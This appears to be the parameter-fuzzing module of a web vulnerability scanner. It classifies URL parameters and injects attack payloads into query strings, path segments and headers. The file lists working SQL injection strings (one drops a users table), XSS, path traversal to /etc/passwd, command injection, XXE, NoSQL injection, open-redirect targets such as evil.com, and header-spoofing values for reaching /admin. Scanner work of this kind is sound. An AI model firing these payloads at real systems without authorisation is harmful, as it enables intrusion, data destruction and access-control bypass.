# scanner/dast/param_engine.py
#
# ENHANCED PARAMETER ENGINE — Comprehensive parameter extraction, discovery, and injection
# Supports hidden parameter brute-forcing, path parameter fuzzing, and header injection

import re
import copy
from typing import Dict, List, Optional, Set, Any, Tuple, Generator, Union
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from enum import Enum

class ParamCategory(Enum):
    IDENTIFIER = "identifier"
    AUTHENTICATION = "authentication"
    SEARCH = "search"
    FILE = "file"
    REDIRECT = "redirect"
    CONTENT = "content"
    PAGINATION = "pagination"
    SORTING = "sorting"
    DEBUG = "debug"
    SAFE = "safe"

class ParamEngine:
    def __init__(self, config: Optional[Dict] = None):
        self.config = {
            "max_params_per_url": 50,
            "max_payloads_per_param": 20,
            "max_path_variants": 10,
            "max_hidden_params": 25,
            "url_encode_payloads": True,
            "test_all_params": False,
            "param_categories": {
                ParamCategory.IDENTIFIER: [
                    "id", "user", "uid", "userid", "user_id", "account", "accountid",
                    "item", "itemid", "product", "productid", "order", "order_id",
                    "invoice", "invoice_id", "doc", "doc_id", "record", "recordid",
                    "customer", "customerid", "client", "clientid", "session", "sessionid",
                ],
                ParamCategory.AUTHENTICATION: [
                    "token", "key", "api_key", "apikey", "auth", "auth_token",
                    "session", "sessionid", "sid", "csrf", "_csrf", "xsrf", "_xsrf",
                    "access_token", "refresh_token", "jwt", "bearer", "oauth", "oauth_token",
                    "password", "pass", "passwd", "pwd", "secret", "secret_key",
                ],
                ParamCategory.SEARCH: [
                    "q", "query", "search", "keyword", "term", "s", "k", "find",
                    "filter", "lookup", "seek", "find", "match", "contains",
                ],
                ParamCategory.FILE: [
                    "file", "path", "dir", "directory", "folder", "document", "doc",
                    "name", "filename", "include", "require", "load", "import", "export",
                    "upload", "download", "attachment", "resource", "asset",
                ],
                ParamCategory.REDIRECT: [
                    "url", "link", "redirect", "next", "return", "dest", "destination",
                    "goto", "redir", "route", "callback", "jsonp", "forward", "to",
                    "out", "exit", "away", "uri", "continue", "target", "location",
                ],
                ParamCategory.CONTENT: [
                    "comment", "message", "text", "content", "body", "description",
                    "title", "subject", "note", "feedback", "review", "rating",
                    "post", "article", "blog", "story", "caption", "summary",
                ],
                ParamCategory.PAGINATION: [
                    "page", "p", "pg", "offset", "limit", "start", "num", "number",
                    "count", "size", "per_page", "from", "to", "range", "window",
                ],
                ParamCategory.SORTING: [
                    "sort", "order", "by", "orderby", "sortby", "direction", "asc",
                    "desc", "group", "groupby", "arrange", "arrangeby", "sequence",
                ],
                ParamCategory.DEBUG: [
                    "debug", "test", "testing", "dev", "development", "preview",
                    "draft", "verbose", "trace", "log", "logging", "diagnostic",
                    "profile", "profiling", "monitor", "monitoring",
                ],
                ParamCategory.SAFE: [
                    "lang", "language", "locale", "region", "country", "currency",
                    "theme", "style", "format", "output", "type", "view", "mode",
                    "version", "platform", "device", "browser", "os",
                ]
            },
            "payload_templates": {
                "sqli": [
                    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' UNION SELECT NULL--",
                    "admin'--", "' OR 1=1--", "' OR 1=1#", "' OR 'a'='a", "' OR 1=1/*",
                    "1; DROP TABLE users; --", "1'; SELECT * FROM users; --",
                ],
                "xss": [
                    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                    "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
                    "javascript:alert(1)", "javascripT:alert(1)", "java%0ascript:alert(1)",
                    "<svg onload=alert(1)>", "<body onload=alert(1)>",
                ],
                "path_traversal": [
                    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
                    "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
                    "..%2f..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5cwindows%5cwin.ini",
                ],
                "open_redirect": [
                    "//evil.com", "https://evil.com", "http://evil.com",
                    "\\evil.com", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
                    "//attacker.com", "http://google.com.evil.com",
                ],
                "ssti": [
                    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
                    "{{''.__class__}}", "${''.getClass()}", "<%= ''.class %>",
                ],
                "cmdi": [
                    "; id", "| id", "$(id)", "`id`", "; whoami", "| whoami",
                    "; ls -la", "| ls -la", "& dir", "| dir", "; ping -c 1 127.0.0.1",
                ],
                "xxe": [
                    "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
                ],
                "nosql": [
                    "{$ne: null}", "{$gt: \"\"}", "{$where: \"1 == 1\"}",
                    "' || '1'=='1", "'; return true;", "admin' || '1'=='1",
                ],
                "type_confusion": [
                    "true", "false", "null", "undefined", "NaN", "Infinity",
                    "[]", "{}", "[1,2,3]", '{"key": "value"}',
                ]
            },
            "header_injections": [
                ("X-Forwarded-For", "127.0.0.1"),
                ("X-Original-URL", "/admin"),
                ("X-Rewrite-URL", "/admin"),
                ("X-Custom-IP-Authorization", "127.0.0.1"),
                ("X-Forwarded-Host", "localhost"),
                ("X-Host", "localhost"),
                ("X-Forwarded-Server", "localhost"),
                ("X-HTTP-Method-Override", "PUT"),
                ("X-Method-Override", "DELETE"),
                ("X-Override-Method", "PATCH"),
                ("Forwarded", "for=127.0.0.1;host=localhost;proto=https"),
                ("X-Real-IP", "127.0.0.1"),
                ("True-Client-IP", "127.0.0.1"),
                ("X-Client-IP", "127.0.0.1"),
                ("X-Remote-IP", "127.0.0.1"),
                ("X-Remote-Addr", "127.0.0.1"),
                ("X-Originating-IP", "127.0.0.1"),
                ("X-Forwarded-Proto", "https"),
                ("X-Forwarded-Port", "443"),
                ("X-Forwarded-Scheme", "https"),
            ]
        }
        
        if config:
            self.config.update(config)
        
        # Build flattened parameter lists
        self.interesting_params = []
        for category_params in self.config["param_categories"].values():
            self.interesting_params.extend(category_params)
        
        self.safe_parameters = self.config["param_categories"][ParamCategory.SAFE]

    def extract_params(self, url: str) -> List[str]:
        """Extract all query parameters from a URL."""
        try:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            return list(query_params.keys())
        except Exception as e:
            print(f"Error extracting parameters from {url}: {e}")
            return []

    def inject_payload(self, url: str, param: str, payload: str, 
                     encode: bool = None) -> str:
        """
        Inject a payload into a specific parameter in the URL.
        
        Args:
            url: The target URL
            param: Parameter name to inject into
            payload: Payload value to inject
            encode: Whether to URL encode the payload (default: config setting)
            
        Returns:
            Modified URL with injected payload
        """
        if encode is None:
            encode = self.config["url_encode_payloads"]
            
        try:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query, keep_blank_values=True)
            
            if encode:
                encoded_payload = quote(payload, safe='')
            else:
                encoded_payload = payload
                
            query_dict[param] = [encoded_payload]
            
            new_query = urlencode(query_dict, doseq=True)
            return urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
        except Exception as e:
            print(f"Error injecting payload into {url}: {e}")
            return url

    def add_param(self, url: str, param: str, value: str = "1") -> str:
        """Add a new parameter to the URL."""
        try:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query, keep_blank_values=True)
            query_dict[param] = [value]
            
            new_query = urlencode(query_dict, doseq=True)
            return urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
        except Exception as e:
            print(f"Error adding parameter to {url}: {e}")
            return url

    def get_param_category(self, param: str) -> Optional[ParamCategory]:
        """Get the category of a parameter."""
        param_lower = param.lower()
        for category, params in self.config["param_categories"].items():
            if param_lower in params:
                return category
        return None

    def get_payloads_for_param(self, param: str) -> List[str]:
        """Get appropriate payloads for a parameter based on its category."""
        category = self.get_param_category(param)
        
        if category == ParamCategory.SAFE:
            return ["1", "test"]  # Benign payloads for safe parameters
            
        payloads = []
        
        # Add payloads based on parameter category
        if category in [ParamCategory.IDENTIFIER, ParamCategory.AUTHENTICATION]:
            payloads.extend(self.config["payload_templates"]["sqli"])
            payloads.extend(self.config["payload_templates"]["nosql"])
            
        if category == ParamCategory.SEARCH:
            payloads.extend(self.config["payload_templates"]["sqli"])
            payloads.extend(self.config["payload_templates"]["xss"])
            payloads.extend(self.config["payload_templates"]["ssti"])
            
        if category == ParamCategory.FILE:
            payloads.extend(self.config["payload_templates"]["path_traversal"])
            payloads.extend(self.config["payload_templates"]["xxe"])
            
        if category == ParamCategory.REDIRECT:
            payloads.extend(self.config["payload_templates"]["open_redirect"])
            
        if category == ParamCategory.CONTENT:
            payloads.extend(self.config["payload_templates"]["xss"])
            payloads.extend(self.config["payload_templates"]["ssti"])
            payloads.extend(self.config["payload_templates"]["cmdi"])
            
        if category == ParamCategory.DEBUG:
            payloads.extend(self.config["payload_templates"]["type_confusion"])
            
        # Add generic payloads for all non-safe parameters
        if category != ParamCategory.SAFE:
            payloads.extend(self.config["payload_templates"]["sqli"][:3])  # Basic SQLi
            payloads.extend(self.config["payload_templates"]["xss"][:2])   # Basic XSS
            
        return list(set(payloads))[:self.config["max_payloads_per_param"]]

    def generate_param_variants(self, url: str) -> Generator[str, None, None]:
        """Generate URL variants with payloads injected into parameters."""
        params = self.extract_params(url)
        if not params:
            yield url
            return
            
        for param in params[:self.config["max_params_per_url"]]:
            payloads = self.get_payloads_for_param(param)
            for payload in payloads:
                yield self.inject_payload(url, param, payload)

    def generate_hidden_param_urls(self, url: str) -> Generator[str, None, None]:
        """Generate URLs with hidden parameters added."""
        existing_params = set(self.extract_params(url))
        added = 0
        
        for param in self.interesting_params:
            if param not in existing_params:
                yield self.add_param(url, param, "1")
                added += 1
                if added >= self.config["max_hidden_params"]:
                    break

    def generate_path_variants(self, url: str) -> Generator[str, None, None]:
        """Generate path-based injection variants."""
        parsed = urlparse(url)
        path = parsed.path
        segments = path.split("/")
        generated = 0
        
        # Look for segments that might be parameters
        for i, segment in enumerate(segments):
            if not segment:
                continue
                
            # Check if segment looks like a parameter (numeric, UUID, etc.)
            if (segment.isdigit() or  # Numeric ID
                re.match(r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$', segment) or  # UUID
                re.match(r'^[a-zA-Z0-9]{16,}$', segment)):  # Long alphanumeric
                
                # Generate variants with different values
                test_values = [
                    "1", "0", "-1", "999999", "admin", "test",
                    "' OR 1=1--", "../../../etc/passwd", "<script>alert(1)</script>"
                ]
                
                for value in test_values:
                    new_segments = segments.copy()
                    new_segments[i] = quote(value, safe='')
                    new_path = "/".join(new_segments)
                    
                    yield urlunparse((
                        parsed.scheme, parsed.netloc, new_path,
                        parsed.params, parsed.query, parsed.fragment
                    ))
                    
                    generated += 1
                    if generated >= self.config["max_path_variants"]:
                        return

    def get_header_injection_params(self) -> List[Tuple[str, str]]:
        """Get header injection parameters."""
        return self.config["header_injections"]

    def generate_header_variants(self, url: str) -> Generator[Tuple[str, Dict[str, str]], None, None]:
        """Generate header injection variants."""
        for header_name, header_value in self.config["header_injections"]:
            headers = {header_name: header_value}
            yield url, headers

    def generate_all_variants(self, url: str) -> Generator[Union[str, Tuple[str, Dict[str, str]]], None, None]:
        """Generate all types of variants for a URL."""
        # Original URL
        yield url
        
        # Parameter injection variants
        yield from self.generate_param_variants(url)
        
        # Hidden parameter variants
        yield from self.generate_hidden_param_urls(url)
        
        # Path variants
        yield from self.generate_path_variants(url)
        
        # Header variants (returned as tuples with headers)
        yield from self.generate_header_variants(url)

    def analyze_url(self, url: str) -> Dict[str, Any]:
        """Analyze a URL and provide information about its parameters."""
        params = self.extract_params(url)
        analysis = {
            "url": url,
            "parameters": [],
            "path_parameters": [],
            "recommended_tests": []
        }
        
        # Analyze query parameters
        for param in params:
            category = self.get_param_category(param)
            analysis["parameters"].append({
                "name": param,
                "category": category.value if category else "unknown",
                "payloads": self.get_payloads_for_param(param)
            })
            
            if category != ParamCategory.SAFE:
                analysis["recommended_tests"].extend([
                    f"SQLi on {param}", f"XSS on {param}"
                ])
        
        # Analyze path for parameters
        parsed = urlparse(url)
        segments = parsed.path.split("/")
        for i, segment in enumerate(segments):
            if (segment.isdigit() or 
                re.match(r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$', segment)):
                analysis["path_parameters"].append({
                    "position": i,
                    "segment": segment,
                    "type": "numeric" if segment.isdigit() else "uuid"
                })
                analysis["recommended_tests"].append(f"Path injection at position {i}")
        
        return analysis

# Legacy functions for backward compatibility
def extract_params(url: str) -> list:
    """Legacy function for backward compatibility"""
    engine = ParamEngine()
    return engine.extract_params(url)

def inject_payload(url: str, param: str, payload: str) -> str:
    """Legacy function for backward compatibility"""
    engine = ParamEngine()
    return engine.inject_payload(url, param, payload)

def add_param(url: str, param: str, value: str = "1") -> str:
    """Legacy function for backward compatibility"""
    engine = ParamEngine()
    return engine.add_param(url, param, value)

INTERESTING_PARAMS = []
SAFE_PARAMETERS = ["lang", "theme"]
HIDDEN_PARAMS = []

# Initialize legacy global variables
engine = ParamEngine()
INTERESTING_PARAMS = engine.interesting_params
SAFE_PARAMETERS = engine.safe_parameters
HIDDEN_PARAMS = [p for p in engine.interesting_params if p not in engine.safe_parameters][:25]
